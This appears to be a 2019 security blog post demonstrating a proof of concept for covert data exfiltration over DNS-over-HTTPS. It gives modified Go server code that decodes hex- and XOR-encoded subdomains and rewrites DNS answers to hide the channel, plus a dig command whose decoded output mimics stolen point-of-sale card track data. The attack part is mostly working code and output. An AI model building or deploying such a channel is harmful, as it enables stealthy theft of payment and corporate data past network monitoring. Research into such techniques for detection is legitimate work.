---
layout: post
title:  "Research into data exfiltration using DOH"
date:   2019-09-22 10:31:12 -0600
categories: exfiltration, c2
---

# Intro
Doing exfiltration over DNS isn't a new concept but recently there's been lots of people jumping on the DNS-over-HTTP(s)[[3]] bandwagon, which adds an interesting new layer to an existing TTP. This blog post is simply an aim to prove it's possibility.
We're going to start with existing code using a DOH server and client written by Star Brilliant[[1]]. This server and client are setup in a way that makes for easy testing where they allow the traffic to passthrough.


# Server
The relevant function in the server file is doDNSQuery which accepts a DNSRequest and then loops through the various upstreams to perform the DNS against. This would give us the ability to easily intercept, manipulate or otherwise inspect the requests that are sent. For a quick POC the idea I had was to add in a configuration value of a domain that we will look for, this means we will only look at decoding subdomains from specific requests and the rest will just passthrough as normal.

So we will add an element to the config structure which will tell the parser toml to look for and load the appropriate value in this case a value for our intercept domain.

```golang
	InterceptDomain  string   `toml:"intercept_domain"`
```

So in our configuration we will have:

```
intercept_domain = "google.com"
```

We will also need a function that can put back together the subdomain pieces, and if we want perform a decoding routine such as XOR.

```golang
func decodeData(data string) string {
	//fmt.Println(data)
	elements := strings.Split(data, string('.'))
	//elements = elements[:len(elements)-3]
	elements2 := strings.Join(elements[:len(elements)-3], string(""))
	blob, _ := hex.DecodeString(elements2)
	for i := 0; i < len(blob); i += 1 {
		blob[i] ^= 0xaa
	}
	return string(blob[:])

}
```

For interception we simply need to check if the request contains the target domain and if so keep a copy of the original host and overload the DNS question record with the target domain. This might seem silly but it prevents leaking our data to the upstream and also allows us to control every aspect of the answer to include overloading it if we so choose. It also muddies the water a bit when it comes to the fact that our fake subdomain resolves to the same IP as the real domain in the answer.

```golang
func (s *Server) doDNSQuery(ctx context.Context, req *DNSRequest) (resp *DNSRequest, err error) {
	// TODO(m13253): Make ctx work. Waiting for a patch for ExchangeContext from miekg/dns.
	numServers := len(s.conf.Upstream)
	//Here is the chance to hook into the request before relaying it forward
	//Need to just add code for checking for a configurable domain I think
	tgtDomain := s.conf.InterceptDomain
	origHost := req.request.Question[0].Name
	if strings.Contains(origHost, tgtDomain) {
		fmt.Println(decodeData(string(origHost)))
		//After decoding the data you would do a passthrough on the root domain without the subdomain data
		//Overwrite with original host
		newHost := retrieveHost(origHost)
		req.request.Question[0].Name = dns.Fqdn(newHost)
	}
```

Some simple code that just does a few checks and then if the original host contains the target domain we print out the decoded data and overwrite the question name with the root domain which in this case will be 'google.com'.

The only thing left will simply be replacing the response data with the original host.

```golang
		if err == nil {
			req.response.Answer[0].Header().Name = dns.Fqdn(origHost)
			req.response.Question[0].Name = dns.Fqdn(origHost)
			//Can overwrite with whatever IP
			/*
			rr := &dns.A{
			Hdr: dns.RR_Header{Name: dns.Fqdn(origHost), Rrtype: dns.TypeA, Class: dns.ClassINET, Ttl: 0},
			A:   net.ParseIP("127.0.0.1"),
			}
			req.response.Answer = []dns.RR{rr}
			*/
			//DEBUG
			//fmt.Println(req.response.Answer[0])
			//fmt.Println(req.response.Question[0])
			return req, nil
		}
		log.Printf("DNS error from upstream %s: %s\n", req.currentUpstream, err.Error())
	}
	return req, err
}
```

# POC execute

So let's test, I'm going to run the client from the git as a dns server pointed to 127.0.0.1 with my DOH server sitting on 8053. This just simplifies testing for me but you can also turn off the cert piece on the DOH server so that it doesn't use TLS and you can see the regular HTTP traffic pretty easily over loopback if you're interested in that.

```
$ dig c9c5c7da82f8cbc7cbdec2c5d8c484eee984efe484.e6e5e9868adad8c5c982dac5d984cfd2cf868acecbdecb82919.b98999e9f9c9d92939a9b98999e9e9.f9793939a9b9bf29b9af2f2f2f2f2f2f29a9a9a9a9a838383.google.com @127.0.0.1
```


On the server our decoded data is printed to the screen.

```
$ sudo ./doh-server


comp(Ramathorn.DC.EN.LOC, proc(pos.exe, data(;1234567890123445=99011X10XXXXXXX00000)))
```




References:  
 1. https://github.com/m13253/dns-over-https  
 2. https://tools.ietf.org/html/rfc8484  
 3. https://github.com/curl/curl/wiki/DNS-over-HTTPS  
 4. https://github.com/miekg/exdns  



 
 
 


[1]:https://github.com/m13253/dns-over-https
[2]:https://tools.ietf.org/html/rfc8484
[3]:https://github.com/curl/curl/wiki/DNS-over-HTTPS
[4]:https://github.com/miekg/exdns


